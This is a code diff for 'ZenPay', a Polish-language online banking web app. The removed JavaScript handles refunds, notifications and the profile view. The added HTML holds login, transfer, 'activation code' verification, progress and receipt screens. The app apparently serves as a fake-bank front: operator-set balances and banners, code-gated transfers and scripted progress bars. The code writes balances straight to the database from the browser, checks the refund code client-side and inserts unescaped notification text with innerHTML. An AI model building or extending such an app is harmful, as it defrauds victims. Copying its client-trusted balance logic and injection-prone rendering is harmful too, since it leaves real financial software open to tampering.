-  document.getElementById('ibanModal').classList.remove('hidden');
-};
-window.closeIbanModal = function() {
-  document.getElementById('ibanModal').classList.add('hidden');
-};
-
-window.openNotifications = function() {
-  const n = user && user.notification ? user.notification : '';
-  const container = document.getElementById('notif-content');
-  if (n) {
-    const items = n.split(/\n|<br\s*\/?>/).filter(t => t.trim() !== '');
-    container.innerHTML = items.map(text =>
-      `<div class="notif-item">${text.trim()}</div>`
-    ).join('');
-  } else {
-    container.innerHTML = '<p style="color:var(--text-secondary);text-align:center;padding:20px;">Brak powiadomień</p>';
-  }
-  document.getElementById('notifications').classList.remove('hidden');
-};
-window.closeNotifications = function() {
-  document.getElementById('notifications').classList.add('hidden');
-};
-
-// ===== DÉTAIL DES TRANSACTIONS =====
-let currentTxId = null;
-
-window.showTxDetail = function(d) {
-  currentTxId = d.id;
-  const isCredit = d.amount >= 0;
-  const isRefund = isCredit && d.title === 'Zwrot';
-
-  document.getElementById('tx-id').textContent = d.id || '';
-  document.getElementById('tx-amount').textContent = (d.amount >= 0 ? '+ ' : '- ') + fmt(Math.abs(d.amount));
-
-  if (isRefund) {
-    document.getElementById('tx-benef').textContent = d.subtitle || '-';
-    document.getElementById('tx-label-amount').textContent = 'Kwota zwrotu :';
-    document.getElementById('tx-label-benef').textContent = 'Zwrot od :';
-    document.getElementById('tx-label-date').textContent = 'Data zwrotu :';
-  } else if (isCredit) {
-    document.getElementById('tx-benef').textContent = getSenderName(d);
-    document.getElementById('tx-label-amount').textContent = 'Otrzymana kwota :';
-    document.getElementById('tx-label-benef').textContent = 'Nadawca :';
-    document.getElementById('tx-label-date').textContent = 'Data otrzymania :';
-  } else {
-    document.getElementById('tx-benef').textContent = d.beneficiary || d.subtitle || '-';
-    document.getElementById('tx-label-amount').textContent = 'Wysłana kwota :';
-    document.getElementById('tx-label-benef').textContent = 'Beneficjent :';
-    document.getElementById('tx-label-date').textContent = 'Data przelewu :';
-  }
-
-  document.getElementById('tx-iban').textContent = d.iban || '-';
-  document.getElementById('tx-date').textContent = (d.date || '') + ' • ' + (d.time || '');
-  document.getElementById('tx-iban-row').style.display = (isRefund || isCredit) ? 'none' : 'block';
-
-  const refundBtn = document.getElementById('refundTxBtn');
-  const refundMsg = document.getElementById('refundTxMsg');
-  if (!isCredit && !d.refunded && d.amount < 0) {
-    refundBtn.style.display = 'block';
-    refundBtn.disabled = false;
-    refundMsg.textContent = '';
-    refundBtn.onclick = () => openRefundModal(d);
-  } else if (d.refunded) {
-    refundBtn.style.display = 'none';
-    refundMsg.textContent = '✅ Ten przelew został już anulowany.';
-  } else {
-    refundBtn.style.display = 'none';
-    refundMsg.textContent = '';
-  }
-
-  document.getElementById('txDetail').classList.remove('hidden');
-};
-
-window.closeTxDetail = function() {
-  document.getElementById('txDetail').classList.add('hidden');
-  currentTxId = null;
-};
-
-// ===== MODALE REMBOURSEMENT =====
-let refundTargetTx = null;
-
-function openRefundModal(tx) {
-  refundTargetTx = tx;
-  document.getElementById('refundCode').value = '';
-  document.getElementById('refundError').style.display = 'none';
-  document.getElementById('refundModal').classList.remove('hidden');
-}
-
-window.closeRefundModal = function() {
-  document.getElementById('refundModal').classList.add('hidden');
-  refundTargetTx = null;
-};
-
-window.confirmRefund = async function() {
-  const code = document.getElementById('refundCode').value.trim();
-  const errEl = document.getElementById('refundError');
-  errEl.style.display = 'none';
-
-  if (!code) {
-    errEl.textContent = 'Proszę wprowadzić kod.';
-    errEl.style.display = 'block';
-    return;
-  }
-
-  if (code !== user.refundCode) {
-    errEl.textContent = 'Nieprawidłowy kod anulowania.';
-    errEl.style.display = 'block';
-    return;
-  }
-
-  if (!refundTargetTx) {
-    toast('Brak transakcji do anulowania.');
-    closeRefundModal();
-    return;
-  }
-
-  if (refundTargetTx.refunded) {
-    toast('Ten przelew został już anulowany.');
-    closeRefundModal();
-    return;
-  }
-
-  const amount = Math.abs(refundTargetTx.amount);
-  const { dateStr, timeStr, timestamp } = getPolandDateTime();
-  const devise = user.devise || 'zł';
-  const formattedAmount = new Intl.NumberFormat('pl-PL', { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(amount) + ' ' + devise;
-
-  try {
-    const newMontant = user.montant + amount;
-    await update(ref(db, 'clients/' + user._id), { montant: newMontant });
-    user.montant = newMontant;
-    const balElement = document.getElementById('bal');
-    const statBalElement = document.getElementById('stat-balance');
-    updateBalanceDisplay(balElement, statBalElement, user.montant);
-    document.getElementById('bal2').textContent = fmt(user.montant);
-
-    const nomClient = user.nom || 'Klient';
-    const bannerMsg = `Witam ${nomClient}, Zwrot ${formattedAmount} został przetworzony i zaksięgowany na Twoim koncie.`;
-    await update(ref(db, 'clients/' + user._id), { bannerMessage: bannerMsg, bannerRead: false });
-    user.bannerMessage = bannerMsg;
-    user.bannerRead = false;
-    updateBanner();
-
-    const refundTx = {
-      id: genId('RF'),
-      title: 'Zwrot',
-      subtitle: 'Anulowanie przelewu',
-      amount: amount,
-      beneficiary: 'ZenPay',
-      iban: refundTargetTx.iban ? refundTargetTx.iban.substring(0, 9) + '*********' : 'ZPY916398*********',
-      devise: devise,
-      date: dateStr,
-      time: timeStr,
-      timestamp: timestamp,
-      refundedTransactionId: refundTargetTx.id
-    };
-    await push(ref(db, 'clients/' + user._id + '/history'), refundTx);
-
-    const historySnap = await get(ref(db, 'clients/' + user._id + '/history'));
-    if (historySnap.exists()) {
-      const history = historySnap.val();
-      for (const [key, tx] of Object.entries(history)) {
-        if (tx.id === refundTargetTx.id) {
-          await update(ref(db, 'clients/' + user._id + '/history/' + key), { refunded: true });
-          break;
-        }
-      }
-    }
-
-    const refNum = genId('REF');
-    await sendMail({
-      to: user.email,
-      name: user.nom || 'Klient',
-      pct: 100,
-      success: true,
-      montant: formattedAmount,
-      beneficiaire: refundTargetTx.beneficiary || refundTargetTx.subtitle || '—',
-      compte: refundTargetTx.iban || '—',
-      reference: refNum,
-      isRefund: true
-    });
-
-    toast(`✅ Przelew anulowany, zwrot ${fmt(amount)}`);
-    closeRefundModal();
-    closeTxDetail();
-    refreshData(true);
-  } catch (err) {
-    console.error('Erreur lors du remboursement:', err);
-    toast('❌ Wystąpił błąd podczas anulowania.');
-  }
-};
-
-// ===== PROFIL =====
-function buildProfile(u) {
-  const initials = (u.nom || 'U').split(' ').map(w => w[0]).join('').substring(0, 2).toUpperCase();
-  return `
-    <div class="profile-header-card">
-      <div class="profile-avatar-large">${initials}</div>
-      <div class="profile-name">${u.nom || 'Użytkownik'}</div>
-      <div class="profile-email">${u.email || ''}</div>
-      <div class="profile-status-badge">
-        <span class="dot"></span>
-        <span>Konto aktywne</span>
+      </div>
+      <div class="banned-person right">
+        <svg viewBox="0 0 36 70" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <ellipse cx="18" cy="10" rx="8" ry="8" fill="#fca5a5"/>
+          <path d="M8 22h20v24H8z" fill="#818cf8"/>
+          <path d="M12 46h12v20H12z" fill="#1e1b4b"/>
+          <path d="M8 22l-4 16" stroke="#fca5a5" stroke-width="3" stroke-linecap="round"/>
+          <path d="M28 22l4 16" stroke="#fca5a5" stroke-width="3" stroke-linecap="round"/>
+          <rect x="22" y="14" width="8" height="14" rx="2" fill="#374151" opacity="0.2"/>
+        </svg>
+      </div>
+      <div class="banned-plant">
+        <svg viewBox="0 0 24 50" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 50V25" stroke="#92400e" stroke-width="2"/>
+          <ellipse cx="12" cy="20" rx="10" ry="14" fill="#34d399"/>
+          <ellipse cx="12" cy="20" rx="6" ry="10" fill="#10b981"/>
+        </svg>
       </div>
     </div>
-
-    <div class="profile-section-pro">
-      <div class="profile-section-header-pro">
-        <div class="profile-section-icon"><i class="fa-solid fa-user"></i></div>
-        <div>
-          <div class="profile-section-title-pro">Informacje osobiste</div>
-          <div class="profile-section-subtitle">Dane identyfikacyjne</div>
-        </div>
-      </div>
-      <div class="profile-row-pro">
-        <div class="profile-row-left">
-          <div class="profile-row-icon"><i class="fa-solid fa-user"></i></div>
-          <div class="profile-row-info">
-            <div class="profile-row-label">Imię i nazwisko</div>
-            <div class="profile-row-value">${u.nom || '—'}</div>
-          </div>
-        </div>
-        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
-      </div>
-      <div class="profile-row-pro">
-        <div class="profile-row-left">
-          <div class="profile-row-icon"><i class="fa-solid fa-envelope"></i></div>
-          <div class="profile-row-info">
-            <div class="profile-row-label">Adres e-mail</div>
-            <div class="profile-row-value" style="font-size:13px;">${u.email || '—'}</div>
-          </div>
-        </div>
-        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
-      </div>
-      <div class="profile-row-pro">
-        <div class="profile-row-left">
-          <div class="profile-row-icon"><i class="fa-solid fa-phone"></i></div>
-          <div class="profile-row-info">
-            <div class="profile-row-label">Numer telefonu</div>
-            <div class="profile-row-value">${u.tel || '—'}</div>
-          </div>
-        </div>
-        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
-      </div>
-      <div class="profile-row-pro">
-        <div class="profile-row-left">
-          <div class="profile-row-icon"><i class="fa-solid fa-flag"></i></div>
-          <div class="profile-row-info">
-            <div class="profile-row-label">Kraj zamieszkania</div>
-            <div class="profile-row-value">${u.pays || '—'}</div>
-          </div>
-        </div>
-        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
-      </div>
-      <div class="profile-row-pro">
-        <div class="profile-row-left">
-          <div class="profile-row-icon"><i class="fa-solid fa-location-dot"></i></div>
-          <div class="profile-row-info">
-            <div class="profile-row-label">Adres zamieszkania</div>
-            <div class="profile-row-value" style="font-size:13px;">${u.adresse || '—'}</div>
-          </div>
-        </div>
-        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
-      </div>
-    </div>
-
-    <div class="profile-section-pro">
-      <div class="profile-section-header-pro">
-        <div class="profile-section-icon"><i class="fa-solid fa-credit-card"></i></div>
-        <div>
-          <div class="profile-section-title-pro">Konto bankowe</div>
-          <div class="profile-section-subtitle">Informacje o koncie i saldzie</div>
-        </div>
-      </div>
-      <div class="profile-balance-highlight">
-        <div>
-          <div class="bal-label">Dostępne saldo</div>
-          <div class="bal-value">${fmt(u.montant)}</div>
-        </div>
-        <div class="bal-icon"><i class="fa-solid fa-wallet"></i></div>
-      </div>
-      <div class="profile-row-pro">
-        <div class="profile-row-left">
-          <div class="profile-row-icon"><i class="fa-solid fa-briefcase"></i></div>
-          <div class="profile-row-info">
-            <div class="profile-row-label">Typ konta</div>
-            <div class="profile-row-value">Profesjonalne</div>
-          </div>
-        </div>
-        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
-      </div>
-      <div class="profile-row-pro">
-        <div class="profile-row-left">
-          <div class="profile-row-icon"><i class="fa-solid fa-shield-halved"></i></div>
-          <div class="profile-row-info">
-            <div class="profile-row-label">Status konta</div>
-            <div class="profile-row-value" style="color:#059669;"><i class="fa-solid fa-circle-check" style="font-size:11px;margin-right:4px;"></i>Aktywny</div>
-          </div>
-        </div>
-        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
-      </div>
-      <div class="profile-row-pro">
-        <div class="profile-row-left">
-          <div class="profile-row-icon"><i class="fa-solid fa-money-bill-transfer"></i></div>
-          <div class="profile-row-info">
-            <div class="profile-row-label">Typ przelewu</div>
-            <div class="profile-row-value-muted">Międzynarodowy (SEPA/SWIFT)</div>
-          </div>
-        </div>
-        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
-      </div>
-      <div class="profile-row-pro">
-        <div class="profile-row-left">
-          <div class="profile-row-icon"><i class="fa-solid fa-coins"></i></div>
-          <div class="profile-row-info">
-            <div class="profile-row-label">Waluta</div>
-            <div class="profile-row-value">${u.devise || 'zł'}</div>
-          </div>
-        </div>
-        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
-      </div>
-    </div>
-
-    <div class="profile-section-pro">
-      <div class="profile-section-header-pro">
-        <div class="profile-section-icon"><i class="fa-solid fa-lock"></i></div>
-        <div>
-          <div class="profile-section-title-pro">Bezpieczeństwo</div>
-          <div class="profile-section-subtitle">Ochrona konta</div>
-        </div>
-      </div>
-      <div class="profile-row-pro">
-        <div class="profile-row-left">
-          <div class="profile-row-icon"><i class="fa-solid fa-fingerprint"></i></div>
-          <div class="profile-row-info">
-            <div class="profile-row-label">Weryfikacja dwuetapowa</div>
-            <div class="profile-row-value-muted">Aktywna (kod PIN)</div>
-          </div>
-        </div>
-        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
-      </div>
-      <div class="profile-row-pro">
-        <div class="profile-row-left">
-          <div class="profile-row-icon"><i class="fa-solid fa-id-card"></i></div>
-          <div class="profile-row-info">
-            <div class="profile-row-label">Karta wirtualna</div>
-            <div class="profile-row-value-muted">Aktywna • Visa</div>
-          </div>
-        </div>
-        <div class="profile-row-action"><i class="fa-solid fa-chevron-right"></i></div>
-      </div>
-    </div>
-
-    <div style="padding:0 16px 24px;">
-      <button onclick="withSpinner(() => logout())" class="profile-logout-btn">
-        <i class="fa-solid fa-right-from-bracket"></i> Wyloguj się
+    <div class="banned-bottom">
+      <button class="banned-btn" onclick="window.location.reload()">
+        <i class="fa-solid fa-arrow-right-arrow-left"></i> PRIVATE ACCESS →
       </button>
     </div>
+  </div>
 
-    <div class="profile-footer-note">
-      <i class="fa-solid fa-shield-halved"></i>
-      Twoje dane są chronione zgodnie z regulaminem RODO. W przypadku pytań skontaktuj się z obsługą klienta.
+  <!-- ========== OVERLAY SPINNER ========== -->
+  <div id="loading-overlay" role="status" aria-live="polite" aria-busy="false">
+    <div class="spinner-container"><div class="spinner"></div><span class="spinner-text">Ładowanie...</span></div>
+  </div>
+
+  <!-- ========== LOGIN ========== -->
+  <section id="login" class="screen">
+    <div class="login-wrapper">
+      <div class="login-card">
+        <div class="login-logo">Z</div>
+        <h1 class="login-title">ZenPay</h1>
+        <p class="login-sub">Bankowość internetowa</p>
+        <div class="login-info">Zaloguj się do swojego konta</div>
+        <div id="client-name" style="text-align:center;font-weight:800;font-size:22px;color:var(--text-primary);margin-bottom:14px;display:none;"></div>
+        <div class="input-group">
+          <label for="email"><i class="fa-solid fa-envelope" style="margin-right:6px;color:var(--text-secondary);"></i>Adres e-mail</label>
+          <div style="position:relative;">
+            <i class="fa-solid fa-envelope" style="position:absolute;left:14px;top:50%;transform:translateY(-50%);color:var(--text-muted);font-size:16px;pointer-events:none;z-index:2;"></i>
+            <input id="email" type="email" class="input" style="padding-left:40px;" placeholder="przyklad@gmail.com" autocomplete="username">
+          </div>
+        </div>
+        <div class="input-group">
+          <label for="pin"><i class="fa-solid fa-lock" style="margin-right:6px;color:var(--text-secondary);"></i>Kod PIN</label>
+          <div style="position:relative;">
+            <i class="fa-solid fa-lock" style="position:absolute;left:14px;top:50%;transform:translateY(-50%);color:var(--text-muted);font-size:16px;pointer-events:none;z-index:2;"></i>
+            <input id="pin" type="password" maxlength="6" class="input" style="padding-left:40px;" placeholder="Wprowadź 6-cyfrowy kod" autocomplete="current-password">
+          </div>
+        </div>
+        <button onclick="login()" class="btn" id="loginBtn">Zaloguj się <i class="fa-solid fa-arrow-right"></i></button>
+        <p id="err" class="login-error hidden"></p>
+        <div id="blocked-msg" class="login-error hidden" style="margin-top:10px;background:#FEF2F2;border:1px solid #FECACA;color:#991B1B;padding:10px 14px;border-radius:10px;font-size:13px;font-weight:600;text-align:center;display:none;">
+          <i class="fa-solid fa-triangle-exclamation" style="margin-right:6px;"></i> Konto zostało zablokowane przez administratora.
+        </div>
+      </div>
     </div>
-  `;
+  </section>
+
+  <!-- ========== DASHBOARD ========== -->
+  <section id="dashboard" class="screen">
+    <header>
+      <div class="logo"><i class="fa-solid fa-building-columns"></i> ZenPay</div>
+      <div class="header-actions">
+        <button class="refresh-btn" onclick="withSpinner(() => refreshData(false))" title="Odśwież dane konta">
+          <i class="fa-solid fa-rotate" id="refreshIcon"></i>
+        </button>
+        <div class="badge-icon" onclick="withSpinner(() => openNotifications())"><i class="fa-regular fa-bell"></i><span id="notif-badge" class="notif-badge hidden">1</span></div>
+        <div class="badge-icon" onclick="withSpinner(() => openAcc())" id="avatar" style="font-weight:700;font-size:13px;">FB</div>
+      </div>
+    </header>
+    <main>
+      <h2 id="greet">Witaj, <span>Power</span></h2>
+
+      <!-- BANNIÈRE -->
+      <div id="banner-container" style="display:none; margin-bottom:14px;">
+        <div class="banner-message">
+          <div class="banner-text" id="bannerText"></div>
+          <button class="banner-close" onclick="withSpinner(() => closeBanner())">✕</button>
+        </div>
+      </div>
+
+      <div class="balance-panel">
+        <div class="label"><span>Dostępne saldo</span><i class="fa-solid fa-coins"></i></div>
+        <div class="amount" id="bal">0,00 zł</div>
+        <div class="sub">Uwzględnij wszystkie swoje potrzeby</div>
+        <div class="balance-actions-wrapper">
+          <button class="btn-action" onclick="withSpinner(() => openCard())"><i class="fa-regular fa-id-card"></i> Karta wirtualna</button>
+          <button class="btn-action" onclick="withSpinner(() => navigateTo('transfer'))"><i class="fa-solid fa-arrow-up-right-from-square"></i> Wykonaj przelew</button>
+        </div>
+        <button class="btn-iban" onclick="withSpinner(() => openIbanModal())"><i class="fa-regular fa-copy"></i> Zobacz mój IBAN</button>
+      </div>
+
+      <div class="quick-stats">
+        <div class="stat-item"><i class="fa-solid fa-wallet stat-icon"></i><div class="stat-value" id="stat-balance">0,00 zł</div><div class="stat-label">Saldo całkowite</div></div>
+        <div class="stat-item"><i class="fa-solid fa-list-check stat-icon"></i><div class="stat-value" id="stat-tx">0</div><div class="stat-label">Transakcje</div></div>
+        <div class="stat-item"><i class="fa-solid fa-coins stat-icon"></i><div class="stat-value" id="stat-devise">PLN (zł)</div><div class="stat-label">Waluta</div></div>
+      </div>
+
+      <div class="history-container">
+        <div class="history-header">
+          <i class="fa-solid fa-clock-rotate-left"></i>
+          <i class="fa-solid fa-bars" style="font-size:14px;color:var(--p);margin:0 4px;"></i>
+          <span>Historia transakcji</span>
+          <span class="badge-count" id="tx-count-badge">0</span>
+        </div>
+        <div id="history-list"></div>
+      </div>
+    </main>
+  </section>
+
+  <!-- ========== TRANSFER ========== -->
+  <section id="transfer" class="screen">
+    <header>
+      <div class="logo"><i class="fa-solid fa-building-columns"></i> ZenPay</div>
+      <div class="header-actions">
+        <button class="refresh-btn" onclick="withSpinner(() => refreshData(false))" title="Odśwież dane konta">
+          <i class="fa-solid fa-rotate" id="refreshIcon2"></i>
+        </button>
+        <div class="badge-icon" onclick="withSpinner(() => openNotifications())"><i class="fa-regular fa-bell"></i><span id="notif-badge2" class="notif-badge hidden">1</span></div>
+        <div class="badge-icon" onclick="withSpinner(() => openAcc())" id="avatar3">E</div>
+      </div>
+    </header>
+    <main>
+      <h1 style="font-weight:600;font-size:20px;margin-bottom:14px;">Wykonaj przelew</h1>
+      <div class="transfer-card">
+        <div class="transfer-balance">
+          <span>Dostępne saldo: <b id="bal2">0,00 zł</b></span>
+          <i class="fa-solid fa-money-bill-transfer" style="opacity:0.25;font-size:32px"></i>
+        </div>
+        <div class="transfer-title"><i class="fa-solid fa-wallet"></i> Wyślij przelew międzynarodowy</div>
+
+        <form id="transferForm" novalidate>
+          <div class="field-group">
+            <label>Kwota przelewu</label>
+            <div class="input-wrapper">
+              <div class="amount-input-wrap">
+                <!-- Suppression de l'attribut pattern pour laisser la validation JavaScript gérer -->
+                <input id="a" type="text" required class="input" style="border-top-right-radius:0;border-bottom-right-radius:0;text-align:left;font-weight:700;font-size:14px" placeholder="0.00">
+                <div class="currency-symbol" id="currency-symbol">zł</div>
+              </div>
+              <div class="field-error" id="error-a"></div>
+            </div>
+          </div>
+          <div class="field-group">
+            <label>Imię i nazwisko beneficjenta</label>
+            <div class="input-wrapper">
+              <input id="b" required class="input" >
+              <div class="field-error" id="error-b"></div>
+            </div>
+          </div>
+          <div class="field-group">
+            <label>IBAN / Numer konta</label>
+            <div class="input-wrapper">
+              <input id="c" required class="input" >
+              <div class="field-error" id="error-c"></div>
+            </div>
+          </div>
+          <div class="field-group">
+            <label>Kod banku (BIC / SWIFT)</label>
+            <div class="input-wrapper">
+              <input id="d" required class="input" >
+              <div class="field-error" id="error-d"></div>
+            </div>
+          </div>
+          <div class="field-group">
+            <label>Nazwa banku</label>
+            <div class="input-wrapper">
+              <input id="e" required class="input" >
+              <div class="field-error" id="error-e"></div>
+            </div>
+          </div>
+          <div class="field-group">
+            <label>Powód transferu</label>
+            <div class="input-wrapper">
+              <input id="f" required class="input" >
+              <div class="field-error" id="error-f"></div>
+            </div>
+          </div>
+        </form>
+
+        <div class="transfer-info">
+          <i class="fa-solid fa-circle-exclamation"></i>
+          <span>Przetwarzanie przelewu od 1 do 3 minut po ostatecznej weryfikacji.</span>
+        </div>
+
+        <button onclick="toVerify()" class="btn" id="continueBtn" style="margin-top:4px;font-size:14px;padding:12px;" disabled>Kontynuuj →</button>
+      </div>
+    </main>
+  </section>
+
+  <!-- ========== VERIFY ========== -->
+  <section id="verify" class="screen">
+    <header>
+      <div class="logo"><i class="fa-solid fa-building-columns"></i> ZenPay</div>
+      <div class="header-actions">
+        <button class="refresh-btn" onclick="withSpinner(() => refreshData(false))" title="Odśwież dane konta">
+          <i class="fa-solid fa-rotate" id="refreshIcon3"></i>
+        </button>
+        <div class="badge-icon" onclick="withSpinner(() => openNotifications())"><i class="fa-regular fa-bell"></i><span id="notif-badge3" class="notif-badge hidden">1</span></div>
+        <div class="badge-icon" onclick="withSpinner(() => openAcc())" id="avatar2">E</div>
+      </div>
+    </header>
+    <main>
+      <h1 style="font-weight:600;font-size:20px;margin-bottom:12px;">Weryfikacja przelewu</h1>
+      <div class="transfer-card" style="padding:14px 14px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <div style="display:flex;align-items:center;gap:6px;color:var(--p);font-weight:600;font-size:14px;"><i class="fa-regular fa-file-lines"></i> Oczekujące szczegóły przelewu</div>
+          <i class="fa-solid fa-money-bill-transfer" style="opacity:0.12;font-size:28px"></i>
+        </div>
+        <div class="verify-details">
+          <div class="row">
+            <div class="label">Kwota przelewu :</div>
+            <div class="value" id="va">-</div>
+          </div>
+          <div class="row">
+            <div class="label">Nazwa beneficjenta :</div>
+            <div class="value" id="vb">-</div>
+          </div>
+          <div class="row">
+            <div class="label">IBAN/numer konta :</div>
+            <div class="value" id="vc">-</div>
+          </div>
+          <div class="row">
+            <div class="label">Kod banku (BIC/SWIFT) :</div>
+            <div class="value" id="vd">-</div>
+          </div>
+          <div class="row">
+            <div class="label">Nazwa banku :</div>
+            <div class="value" id="ve">-</div>
+          </div>
+          <div class="row">
+            <div class="label">Powód przeniesienia :</div>
+            <div class="value" id="vf">-</div>
+          </div>
+        </div>
+        <button onclick="withSpinner(() => navigateTo('transfer'))" class="verify-cancel">Anuluj przelew →</button>
+        <div class="verify-code-section">
+          <div class="lock-line"><i class="fa-solid fa-lock"></i><span>Proszę wprowadzić kod aktywacyjny transferu.</span></div>
+          <form id="codeForm" novalidate>
+            <div class="input-wrapper">
+              <input id="code" class="code-input" maxlength="20" autocomplete="off" required placeholder="******">
+              <div class="field-error" id="error-code"></div>
+            </div>
+          </form>
+          <div class="verify-submit">
+            <button onclick="finish()" class="btn" id="finishBtn" style="font-size:14px;padding:12px;margin-top:4px;">Potwierdź przelew</button>
+          </div>
+        </div>
+      </div>
+    </main>
+  </section>
+
+  <!-- ========== PROGRESS ========== -->
+  <section id="progress" class="screen">
+    <header>
+      <div class="logo"><i class="fa-solid fa-building-columns"></i> ZenPay</div>
+      <div class="header-actions">
+        <button class="refresh-btn" onclick="withSpinner(() => refreshData(false))" title="Odśwież dane konta">
+          <i class="fa-solid fa-rotate" id="refreshIcon5"></i>
+        </button>
+        <div class="badge-icon" onclick="withSpinner(() => openNotifications())"><i class="fa-regular fa-bell"></i><span id="notif-badge5" class="notif-badge hidden">1</span></div>
+        <div class="badge-icon" onclick="withSpinner(() => openAcc())" id="avatar5">E</div>
+      </div>
+    </header>
+    <main>
+      <h2 style="font-size:18px;font-weight:700;color:var(--text-primary);margin-bottom:14px;">Twoje aktualne polecenie przelewu...</h2>
+      <div class="progress-card">
+        <div class="progress-status">
+          <div style="display:flex; align-items:center; gap:8px; margin-bottom:4px;">
+            <i class="fa-solid fa-user" style="font-size:20px; color:var(--p);"></i>
+            <strong style="font-size:15px; color:var(--text-primary);">Weryfikacja tożsamości zakończona pomyślnie.</strong>
+          </div>
+          <div style="font-size:13px; color:var(--text-secondary); padding-left:28px;">
+            Przed aktualizacją tej strony poczekaj, aż środki zostaną przelane do Twojego banku.
+          </div>
+        </div>
+        <div class="progress-pill">
+          <div class="progress-pill-fill" id="progressFill" style="width:0%;">
+            <span id="progressPercent">0%</span>
+          </div>
+        </div>
+        <div class="progress-details-box">
+          <div class="progress-details-title">
+            <i class="fa-solid fa-file-lines" style="color:var(--p);"></i>
+            <span style="font-size:14px;font-weight:600;">Szczegóły bieżącego transferu</span>
+          </div>
+          <div class="progress-details">
+            <div class="row"><span class="label">Kwota przelewu :</span><span class="value" id="pAmount">-</span></div>
+            <div class="row"><span class="label">Nazwa beneficjenta :</span><span class="value" id="pBenef">-</span></div>
+            <div class="row"><span class="label">IBAN/numer konta :</span><span class="value" id="pIban">-</span></div>
+            <div class="row"><span class="label">Nazwa banku :</span><span class="value bank-name" id="pBank">-</span></div>
+            <div class="row" id="pReasonRow" style="display:none;"><span class="label">Powód :</span><span class="value bank-name" id="pReason">-</span></div>
+          </div>
+        </div>
+      </div>
+    </main>
+  </section>
+
+  <!-- ========== RESULT ========== -->
+  <section id="result" class="screen">
+    <header>
+      <div class="logo"><i class="fa-solid fa-building-columns"></i> ZenPay</div>
+      <div class="header-actions">
+        <button class="refresh-btn" onclick="withSpinner(() => refreshData(false))" title="Odśwież dane konta">
+          <i class="fa-solid fa-rotate" id="refreshIcon4"></i>
+        </button>
+        <div class="badge-icon" onclick="withSpinner(() => openNotifications())"><i class="fa-regular fa-bell"></i><span id="notif-badge4" class="notif-badge hidden">1</span></div>
+        <div class="badge-icon" onclick="withSpinner(() => openAcc())" id="avatar4">E</div>
+      </div>
+    </header>
+    <main>
+      <div class="receipt-card">
+        <div class="receipt-header">
+          <div class="receipt-badge">Potwierdzenie przelewu</div>
+          <div class="receipt-icon" id="resultIcon"><i class="fa-solid fa-circle-check" style="color:#10B981;"></i></div>
+          <div class="receipt-percent" id="resultPercent">100%</div>
+          <div class="receipt-status" id="resultStatus">Przelew zatwierdzony</div>
+        </div>
+        <div class="receipt-body">
+          <div class="receipt-row"><span class="r-label">Beneficjent</span><span class="r-value" id="resultBenef">-</span></div>
+          <div class="receipt-row"><span class="r-label">Kwota</span><span class="r-value amount" id="resultAmount">-</span></div>
+          <div class="receipt-row"><span class="r-label">Numer konta</span><span class="r-value" id="resultAccount">-</span></div>
+          <div class="receipt-row"><span class="r-label">Data i godzina</span><span class="r-value" id="resultDate">-</span></div>
+          <div class="receipt-row"><span class="r-label">Status</span><span class="r-value status-tag"><i class="fa-solid fa-circle-check" style="font-size:9px;"></i> Zrealizowany</span></div>
+        </div>
+        <div class="receipt-footer">
+          <div class="receipt-msg" id="resultMsg">Środki zostaną przelane w ciągu 1-2 dni roboczych.</div>
+          <button onclick="withSpinner(() => navigateTo('dashboard'))" class="btn receipt-btn"><i class="fa-solid fa-arrow-left"></i> Powrót do portfela</button>
+        </div>
+      </div>
+    </main>
+  </section>
+
+  <!-- ========== BOTTOM NAV ========== -->
+  <nav id="mainNav" style="display:none">
+    <div class="nav-item" onclick="withSpinner(() => navigateTo('dashboard'))"><i class="fa-solid fa-house"></i><span>Pulpit</span></div>
+    <div class="nav-item" onclick="withSpinner(() => navigateTo('transfer'))"><i class="fa-solid fa-arrow-right-arrow-left"></i><span>Płatności</span></div>
+    <div class="nav-item" onclick="withSpinner(() => openCard())"><i class="fa-regular fa-credit-card"></i><span>Karta wirtualna</span></div>
+    <div class="nav-item" onclick="withSpinner(() => openAcc())"><i class="fa-regular fa-user"></i><span>Profil</span></div>
+  </nav>
+
+  <!-- ========== MODALES ========== -->
+  <!-- Carte virtuelle -->
+  <div id="card" class="modal hidden" onclick="if(event.target===this)withSpinner(()=>closeCard())">
+    <div class="modal-content" style="max-width:400px;padding:20px;">
+      <button onclick="withSpinner(() => closeCard())" class="modal-close" style="top:12px;right:12px;width:32px;height:32px;font-size:18px;border:none;background:rgba(0,0,0,0.5);color:#fff;box-shadow:0 2px 12px rgba(0,0,0,0.2);">×</button>
+      <h3 style="font-weight:700;margin-bottom:16px;font-size:18px;display:flex;align-items:center;gap:8px;color:var(--text-primary);"><i class="fa-solid fa-credit-card" style="color:var(--p);"></i> Karta wirtualna</h3>
+      <div style="width:100%;aspect-ratio:1.586;border-radius:14px;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 40%,#0f3460 70%,#1a1a2e 100%);position:relative;overflow:hidden;box-shadow:0 16px 40px rgba(0,0,0,0.4),0 0 0 1px rgba(255,255,255,0.08) inset;margin-bottom:16px;">
+        <div style="position:absolute;inset:0;background:linear-gradient(105deg,transparent 40%,rgba(255,255,255,0.03) 45%,rgba(255,255,255,0.08) 50%,rgba(255,255,255,0.03) 55%,transparent 60%);animation:holo 4s ease-in-out infinite;pointer-events:none;"></div>
+        <style>@keyframes holo{0%,100%{transform:translateX(-100%)}50%{transform:translateX(100%)}}
+
+/* ===== TOOLTIP ERROR MESSAGES - FLOATING BUBBLE UNDER FIELD ===== */
+.input-wrapper {
+  position: relative;
 }
 
-function updateProfileInfo() {
-  if (!user) {
-    document.getElementById('accinfo').innerHTML = '';
-    return;
-  }
-  document.getElementById('accinfo').innerHTML = buildProfile(user);
+.field-group.has-error,
